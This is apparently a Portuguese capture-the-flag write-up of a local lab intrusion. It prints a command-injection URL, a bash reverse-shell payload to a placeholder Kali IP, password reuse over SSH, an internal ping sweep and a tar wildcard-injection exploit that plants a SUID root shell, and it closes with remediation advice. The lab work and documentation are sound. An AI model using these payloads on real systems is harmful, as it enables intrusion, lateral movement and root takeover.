<div align="center">


</div>

```bash
gabi@cyber-lab:~$ cat challenge.meta
```
```json
{
  "ctf": "Tribo Tecnologia - Linux",
  "pontos": 200,
  "sha256": "6807D54F67A456E5367D190534C4DB6944111ACC088419EA022D7E26CD7F6339",
  "ambiente": "laboratório local (VirtualBox) — Kali Linux atacando 2 VMs",
  "topologia": "Kali → Host-only (192.168.56.0/24) → DMZ (web01, .56.10) → Internal Network (192.168.57.0/24) → host interno (app02, .57.20)",
  "escopo": "apenas os ativos do laboratório, sem ataques destrutivos"
}
```

> Red teamer contratada para avaliar o único ativo alcançável — o servidor de perímetro (DMZ) — e investigar se, a partir dele, é possível alcançar um sistema interno que não deveria estar exposto. Objetivo: root na DMZ, movimentação lateral, root no host interno, flag final.

---

## 🧠 mentalidade geral

O desafio avisava desde o início: *"nem tudo que parece vulnerável é o caminho, e nenhuma escalação é óbvia."* Isso se confirmou várias vezes — reconhecer um falso positivo rápido foi tão importante quanto achar a vulnerabilidade real:

- 🚩 `http-open-proxy` do Nmap sinalizou a porta 8080 como proxy aberto → testado manualmente, **falso positivo**.
- 🚩 LinPEAS apontou o kernel como `potentially vulnerable` a uma CVE recente → **sem exploit público**, descartado.
- 🚩 Grupo `lxd` citado como vetor "root-equivalent" → existia, mas **vazio**, caminho morto.
- ✅ O vetor real — wildcard injection num script de backup — **não apareceu em nenhuma varredura automatizada**. Foi achado enumerando permissões SGID manualmente, seguindo uma pista textual repetida em dois dashboards diferentes: *"rotina de backup — agendada"*.

A cada etapa: enumerar amplamente → testar a hipótese mais barata primeiro → documentar o que foi descartado com o mesmo cuidado que o que funcionou.

---

## 🗺️ kill chain

```mermaid
flowchart LR
    A["🔍 Reconhecimento
    T1595 · host discovery"] --> B["🕸️ Enumeração
    T1046 · gobuster, curl"]
    B --> C["💉 RCE no Perímetro
    T1190 · ping.php"]
    C --> D["🔑 Credenciais & Pivô
    T1552 · config.php"]
    D --> E["🐾 Movimentação Lateral
    T1021 · SSH reciclado"]
    E --> F["👑 Root no Host Interno
    T1548 · tar wildcard"]

    style A fill:#0d0221,stroke:#9333ea,color:#fff
    style B fill:#0d0221,stroke:#9333ea,color:#fff
    style C fill:#0d0221,stroke:#a855f7,color:#fff
    style D fill:#0d0221,stroke:#a855f7,color:#fff
    style E fill:#0d0221,stroke:#c084fc,color:#fff
    style F fill:#2d0a4e,stroke:#e879f9,color:#fff
```



---

## 1️⃣ reconhecimento

Captura ARP na rede Host-only revelou três hosts: o gateway (`.1`), o alvo declarado (`192.168.56.10`) e um terceiro IP não documentado (`192.168.56.100`) — tratado como ruído, fora de escopo.

```bash
nmap -sC -sV -p- -T4 192.168.56.10
```

| Porta | Serviço | Observação |
| --- | --- | --- |
| 22/tcp | OpenSSH 9.6p1 | padrão |
| 80/tcp | nginx 1.24.0 | site institucional |
| 8080/tcp | Apache 2.4.58 | sinalizado como possível *open proxy* (falso positivo) |

---

## 2️⃣ enumeração de serviços

Porta 80 descartada rápido — código-fonte limpo, `gobuster` sem achados além do `index.html`.

```bash
gobuster dir -u http://192.168.56.10:8080 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,json
```

Achado: `/tools/ping.php` com listagem de diretório aberta — nome clássico de ferramenta web que roda comando de SO sem sanitização.

---

## 3️⃣ exploração inicial (perímetro)

```bash
curl "http://192.168.56.10:8080/tools/ping.php?host=127.0.0.1;whoami"
# → www-data
```

OS Command Injection confirmada (**T1190**). Escalado para reverse shell interativa:

```bash
# listener no Kali
nc -lvnp 4444

# payload injetado via ping.php
host=127.0.0.1;bash -c 'bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1'
```

Shell caiu como `www-data@web01`, upgradada com:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 4️⃣ pós-exploração no perímetro

Leitura de arquivos crus via RCE revelou credenciais em `config.php`:

```php
$db_host = '127.0.0.1';
$db_name = 'corpapp';
$db_user = 'webapp';
$db_pass = 'Trib0Web!2024';
```

**T1552.001 — Credentials in Files.** Banco só escutava em `localhost` — credencial guardada como candidata a reciclagem.

A descoberta decisiva veio de `ip a`:

```
enp0s3: 192.168.56.10/24   ← DMZ (já conhecida)
enp0s8: 192.168.57.10/24   ← segunda interface, rede interna
```

`web01` era **dual-homed** — a rota de pivô para a rede interna `192.168.57.0/24`.

---

## 5️⃣ movimentação lateral

Sem rota direta do Kali para a rede interna, todo reconhecimento aconteceu de dentro do `web01`:

```bash
for i in $(seq 1 254); do (ping -c1 -W1 192.168.57.$i &>/dev/null && echo "192.168.57.$i ativo") & done; wait
```

Revelou `192.168.57.20` (`app02`) com portas 22 e 80 abertas (80 era um dashboard puramente decorativo).

A credencial do banco, já descartada no perímetro, foi testada contra o SSH do host interno:

```bash
ssh jdias@192.168.57.20
# senha: Trib0Web!2024 → funcionou
```

**T1021.004 / T1078 — reciclagem de credencial.** Lição: uma credencial que falha num contexto não deve ser descartada para outros.

---

## 6️⃣ escalação de privilégio (host interno)

### vetores testados e descartados

| Vetor | Resultado |
| --- | --- |
| `sudo -l` | sem entrada no sudoers |
| SUID (`find -perm -4000`) | apenas binários padrão |
| Capabilities (`getcap -r /`) | apenas `ping`, `mtr` |
| CVE de kernel (LinPEAS) | sem exploit público |
| Grupo `lxd` | existente, mas vazio |

### o vetor real: wildcard injection em script de backup

Dois dashboards mencionavam "rotina de backup — agendada". Busca por binários **SGID** revelou `run_backup.sh`, de propriedade do `root`, legível por "outros":

```bash
#!/bin/bash
cd /home/jdias/reports || exit 1
/usr/bin/tar czf /opt/backups/reports-latest.tgz *
```

O script usa `*` dentro de um diretório de propriedade do usuário comprometido. O GNU `tar` interpreta argumentos iniciados por `--` como **opção**, não nome de arquivo — **wildcard injection** clássica (**T1548.001**, CWE-88):

```bash
cd ~/reports
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > payload.sh
chmod +x payload.sh

touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh payload.sh"
```

Após o ciclo de agendamento (~5 min), o `tar` rodou como root e executou o payload:

```
-rwsr-sr-x 1 root root 1446024 /tmp/rootbash
```

```bash
/tmp/rootbash -p
id
# uid=1001(jdias) ... euid=0(root) egid=0(root)
```

---

## 🚩 flags

| Flag | Origem | Nível |
| --- | --- | --- |
| `FLAG{B-user-5d2e77}` | `/home/jdias/user.txt` | usuário (checkpoint) |
| `FLAG{B-root-e0a4f9}` | `/root/root.txt` | **root — flag final** 🎉 |

---

## 🛡️ lições aprendidas / remediação

| Achado | Recomendação |
| --- | --- |
| `ping.php` executa comando do SO sem sanitização | Eliminar `shell_exec`; usar função nativa ou `escapeshellarg()` + allowlist |
| `web01` dual-homed sem controles extras | Firewall/ACL entre DMZ e rede interna — a topologia sozinha não basta |
| Credencial em texto puro, reciclada entre serviços | Gerenciador de segredos + senha única por conta |
| `tar czf ... *` em diretório gravável pelo usuário | `tar -- *` ou enumerar arquivos explicitamente |
| Conta de serviço no grupo `sudo` sem necessidade clara | Revisar privilégio mínimo |
| Nenhum alerta disparado durante a injeção ou a escalada | Auditoria (`auditd`) para execuções incomuns de `tar` e processos filhos inesperados de serviços web |

---

<div align="center">

🐱‍💻 *caçada documentada por [TheKittzy](https://github.com/TheKittzy) — ética em primeiro lugar, curiosidade sempre* 🔐

</div>
